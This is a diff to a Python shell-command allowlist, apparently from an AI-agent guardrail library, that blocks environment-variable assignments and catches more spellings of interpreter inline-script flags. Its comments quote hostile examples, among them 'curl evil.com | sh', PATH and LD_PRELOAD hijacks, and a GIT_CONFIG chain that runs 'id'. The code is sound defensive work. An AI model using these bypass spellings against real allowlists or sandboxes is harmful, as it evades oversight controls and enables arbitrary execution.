@@ -2,6 +2,7 @@
 
 import re
 import shlex
+import warnings
 from collections.abc import Iterator
 from dataclasses import dataclass
 from urllib.parse import urlparse
@@ -22,6 +23,7 @@ CATEGORY_SCHEME_NOT_ALLOWED = "scheme_not_allowed"
 CATEGORY_USERINFO_TRICK = "userinfo_trick"
 CATEGORY_METACHARACTER = "metacharacter"
 CATEGORY_INTERPRETER = "interpreter"
+CATEGORY_ENVIRONMENT_ASSIGNMENT = "environment_assignment"
 CATEGORY_DESTRUCTIVE_COMMAND = "destructive_command"
 CATEGORY_NETWORK_UTILITY = "network_utility"
 CATEGORY_UNPARSEABLE = "unparseable"
@@ -343,14 +345,20 @@ class SecretPatternFilter:
 _SHELL_OPERATOR_CHARS = (";", "|", "&", "`", "$", ">", "<", "\n", "\r")
 
 # A leading NAME=value token is an environment assignment, not the command.
-# ``FOO=bar curl ...`` runs curl; a rule that read the first token as the binary
-# would see "FOO=bar", miss the allowlist, and block for the wrong reason -- or,
-# worse, a rule that skipped unknown leading tokens would let it through.
-_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
+# ``FOO=bar curl ...`` runs curl, so the binary must be resolved past it.
+#
+# Resolving past one is NOT the same as ignoring it. The environment decides
+# which program a name resolves to and how that program behaves, so an
+# assignment is an execution vector in its own right: ``PATH=/tmp/pwn ls`` runs
+# the attacker's ``ls``, ``LD_PRELOAD=…`` injects code into the genuine one, and
+# ``GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=id
+# git status`` makes an allowlisted ``git status`` spawn ``id``. Assignments are
+# therefore refused unless the defender names them in ``allowed_env``.
+_ASSIGNMENT = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=")
 
-# Interpreters whose inline-script flag turns the following argument into an
-# arbitrary program. ``sh -c "curl evil.com | sh"`` is a single argv whose real
-# payload is a string, so allowlisting the binary would allowlist everything.
+# Interpreters that can be made to run a program supplied on the command line.
+# Allowlisting one of these is close to allowlisting arbitrary execution, which
+# is why the constructor warns about it.
 _INTERPRETERS = frozenset(
     {
         "sh",
@@ -362,21 +370,48 @@ _INTERPRETERS = frozenset(
         "tcsh",
         "fish",
         "ash",
+        "busybox",
         "python",
         "python2",
         "python3",
         "perl",
         "ruby",
         "node",
+        "deno",
+        "bun",
         "php",
+        "lua",
+        "tclsh",
+        "expect",
         "pwsh",
         "powershell",
         "osascript",
         "awk",
+        "gawk",
+        "mawk",
+        "sed",
+        "ed",
     }
 )
 
-_INLINE_SCRIPT_FLAGS = frozenset({"-c", "-e", "--command", "-command", "/c"})
+# Short option letters that make an interpreter read its program from the
+# command line or stdin rather than from a named file: -c code, -e code,
+# perl -E, node -p, sh -s.
+_INLINE_SCRIPT_LETTERS = frozenset("ceps")
+
+# Long spellings of the same thing. Compared after stripping any "=value".
+_INLINE_SCRIPT_LONG_FLAGS = frozenset(
+    {
+        "--command",
+        "--eval",
+        "--exec",
+        "--print",
+        "-command",
+        "-encodedcommand",
+        "/c",
+        "/command",
+    }
+)
 
 
 def _binary_name(token: str) -> str:
@@ -389,26 +424,67 @@ def _binary_name(token: str) -> str:
     return token.rsplit("/", 1)[-1]
 
 
-def _resolve_binary(argv: list[str]) -> tuple[int, str] | None:
-    """Find the real executable in an argv, skipping env-assignment noise.
+def _is_inline_script_flag(token: str) -> bool:
+    """Does this argument hand an interpreter a program to run?
 
-    Returns its index and bare name, or None when the argv carries no command.
-    Handles ``FOO=bar cmd`` and ``env FOO=bar cmd``; anything else is taken at
+    Exact matching on ``{"-c", "-e"}`` is not enough, because every one of these
+    spellings means the same thing to the interpreter and none of them is that
+    string: ``-cCODE`` (value attached), ``-lc`` / ``-ec`` (bundled short
+    cluster), ``--eval=CODE`` (long form with value), ``node -p``, and a bare
+    ``-`` for a script on stdin. Each was a working bypass before this function
+    replaced the set lookup.
+    """
+    lowered = token.lower()
+
+    # A bare "-" means "read the program from stdin".
+    if lowered == "-":
+        return True
+
+    if lowered.startswith("--") or lowered.startswith("/"):
+        return lowered.split("=", 1)[0] in _INLINE_SCRIPT_LONG_FLAGS
+
+    if lowered.startswith("-") and len(lowered) > 1:
+        # A short cluster: scan the option letters, stopping where an attached
+        # value begins. "-lc" carries -c; "-0e'print 1'" carries -e.
+        for char in lowered[1:]:
+            if char in _INLINE_SCRIPT_LETTERS:
+                return True
+            if not char.isalnum():
+                break
+        return False
+
+    return False
+
+
+def _resolve_binary(argv: list[str]) -> tuple[int, str, list[str]] | None:
+    """Find the real executable in an argv, and report the environment it carries.
+
+    Returns the binary's index, its bare name, and the NAME=value assignment
+    tokens that preceded it -- ``None`` when the argv carries no command.
+    Handles ``FOO=bar cmd`` and ``env FOO=bar cmd``. Anything else is taken at
     face value, so a wrapper like ``sudo`` resolves to ``sudo`` and is judged on
     its own merits rather than being transparently unwrapped.
+
+    The assignments are returned rather than discarded: the caller must decide
+    whether to permit them, because they can redirect or subvert the very binary
+    the allowlist just approved.
     """
     index = 0
+    assignments: list[str] = []
+
     while index < len(argv) and _ASSIGNMENT.match(argv[index]):
+        assignments.append(argv[index])
         index += 1
 
     if index < len(argv) and _binary_name(argv[index]) == "env":
         index += 1
         while index < len(argv) and _ASSIGNMENT.match(argv[index]):
+            assignments.append(argv[index])
             index += 1
 
     if index >= len(argv):
         return None
-    return index, _binary_name(argv[index])
+    return index, _binary_name(argv[index]), assignments
 
 
 def _iter_commands(data: object, seen: set[int]) -> Iterator[str | list[str]]:
@@ -474,22 +550,34 @@ class ShellCommandAllowList:
       argv, so ``ls   -la`` and ``"ls" -la`` are the same command.
     - **A leading path is stripped** -- ``/usr/bin/curl``, ``./curl`` and
       ``curl`` all resolve to ``curl``, so a path prefix is not a bypass.
-    - **Environment assignments are skipped** to find the real binary, so
-      ``FOO=bar curl …`` and ``env FOO=bar curl …`` are judged as ``curl``.
+    - **Environment assignments are refused.** ``PATH=/tmp/pwn ls`` and
+      ``env LD_PRELOAD=… ls`` are blocked, not quietly stripped: the environment
+      decides which program a name resolves to and how it behaves, so an
+      assignment subverts the binary the allowlist just approved. Name the
+      variables you genuinely need in ``allowed_env``.
     - **Shell metacharacters are rejected outright** (``;`` ``|`` ``&`` ``$``
       backtick ``>`` ``<``). ``ls; curl evil.com`` parses to a first token of
       ``ls``, so without this a chained command would ride in on an allowlisted
       binary. They are rejected in argv form too: the policy cannot know whether
       the tool passes the command to a shell, so it assumes the dangerous case.
     - **Inline interpreter scripts are rejected** -- ``sh -c "…"``,
-      ``python -c "…"`` -- because the real program is a string that argv
-      matching cannot inspect. This holds *even if the interpreter is
-      allowlisted*: permitting ``sh`` must not silently permit everything.
+      ``python -cCODE``, ``bash -lc "…"``, ``node --eval=…``, ``node -p``,
+      ``python -`` -- because the real program is a string that argv matching
+      cannot inspect. Detection is structural, not a list of exact spellings.
     - **Unparseable input fails closed.** A command with an unbalanced quote is
       blocked, not passed along on the guess that it was harmless.
 
     Known limits, in the same spirit as the other bundled rules:
 
+    - **Do not allowlist an interpreter.** Rejecting ``-c`` is best-effort, not
+      a boundary: ``awk 'BEGIN{system("id")}'`` carries its program as a plain
+      positional argument, and ``sh script.sh`` or ``python evil.py`` run a file
+      this rule never sees. Allowlisting ``sh``, ``python``, ``node`` or ``awk``
+      is close to allowlisting arbitrary execution, and the constructor warns
+      when you do. Allowlist the specific *program*, not the interpreter.
+    - **An allowlisted name authorises whatever the OS resolves it to.** This
+      rule reads the command, not the filesystem. Pin ``PATH`` and the working
+      directory at the tool, or an attacker-writable ``./ls`` is still an ``ls``.
     - **It treats every string it sees as a command.** Because a policy sees one
       argument at a time and cannot know its name, there is no way to tell a
       ``command`` argument from a ``cwd`` one. Put this on an engine guarding a
@@ -498,20 +586,37 @@ class ShellCommandAllowList:
     - **It governs the command, not what the command then does.** An allowlisted
       ``git`` still accepts ``git config`` and ``--upload-pack``. Allowlist the
       narrowest prefix that does the job.
+    - **Dict keys are not read as commands**, only values -- see
+      :func:`_iter_commands`.
     - It is not a shell. Parsing follows :mod:`shlex` POSIX rules, which is
       close to ``sh`` but not identical to every shell in every mode.
     """
 
-    def __init__(self, allowed_commands: list[str] | list[list[str]]) -> None:
+    def __init__(
+        self,
+        allowed_commands: list[str] | list[list[str]],
+        allowed_env: set[str] | frozenset[str] | None = None,
+    ) -> None:
         """Build the allowlist.
 
         Args:
             allowed_commands: Permitted commands, each an argv prefix. A string
                 entry is parsed with :func:`shlex.split`; a list entry is taken
                 as literal tokens.
+            allowed_env: Environment variable *names* the command may set, e.g.
+                ``{"LANG"}``. Everything else is refused. Empty by default,
+                because the dangerous names are not enumerable -- ``PATH``,
+                ``LD_PRELOAD``, ``BASH_ENV``, ``GIT_SSH_COMMAND``,
+                ``PYTHONSTARTUP``, ``NODE_OPTIONS`` and more all turn an
+                allowlisted binary into an execution primitive. Opting a name in
+                means accepting whatever value the caller supplies for it.
 
         Raises:
-            ValueError: An entry is empty, or a string entry cannot be parsed.
+            ValueError: An entry is empty, unparseable, or can never match.
+
+        Warns:
+            UserWarning: An entry names a known interpreter, which is close to
+                allowlisting arbitrary execution.
         """
         normalized: list[tuple[str, ...]] = []
         for entry in allowed_commands:
@@ -525,9 +630,32 @@ class ShellCommandAllowList:
 
             if not tokens:
                 raise ValueError("Allowlist entries must name a command; got an empty entry")
+
+            # An entry that resolves to an assignment or to bare `env` could
+            # never match a command, because resolution skips both. Silently
+            # keeping it would leave the defender believing it was in force.
+            if _ASSIGNMENT.match(tokens[0]) or _binary_name(tokens[0]) == "env":
+                raise ValueError(
+                    f"Allowlist entry {entry!r} can never match: name the binary itself, "
+                    f"and list any permitted environment variables in allowed_env"
+                )
+
             normalized.append((_binary_name(tokens[0]), *tokens[1:]))
 
         self.allowed_commands = tuple(normalized)
+        self.allowed_env = frozenset(allowed_env or ())
+
+        interpreters = sorted({c[0] for c in normalized if c[0].lower() in _INTERPRETERS})
+        if interpreters:
+            warnings.warn(
+                f"ShellCommandAllowList permits the interpreter(s) {', '.join(interpreters)}. "
+                f"An interpreter can be made to run arbitrary code in ways argv inspection "
+                f"cannot enumerate (a positional awk program, a script file, stdin), so this "
+                f"is close to allowlisting arbitrary execution. Allowlist the specific program "
+                f"instead where you can.",
+                UserWarning,
+                stacklevel=2,
+            )
 
     def __call__(self, data: object) -> Violation | None:
         """Check every command reachable from a value against the allowlist.
@@ -579,11 +707,24 @@ class ShellCommandAllowList:
         resolved = _resolve_binary(argv)
         if resolved is None:
             return self._block("Command names no executable", CATEGORY_UNPARSEABLE)
-        index, binary = resolved
+        index, binary, assignments = resolved
+
+        # An assignment is not noise to be skipped past. PATH= redirects the
+        # allowlisted name to another file, LD_PRELOAD= injects code into the
+        # genuine one, and GIT_SSH_COMMAND=/GIT_CONFIG_* turn `git status` into
+        # an exec primitive. Refuse any the defender has not opted into.
+        for assignment in assignments:
+            match = _ASSIGNMENT.match(assignment)
+            name = match.group(1) if match else assignment
+            if name not in self.allowed_env:
+                return self._block(
+                    f"Command sets the environment variable '{name}'",
+                    CATEGORY_ENVIRONMENT_ASSIGNMENT,
+                )
 
         arguments = argv[index + 1 :]
         if binary.lower() in _INTERPRETERS and any(
-            argument.lower() in _INLINE_SCRIPT_FLAGS for argument in arguments
+            _is_inline_script_flag(argument) for argument in arguments
         ):
             return self._block(
                 f"Inline script passed to the interpreter '{binary}'",
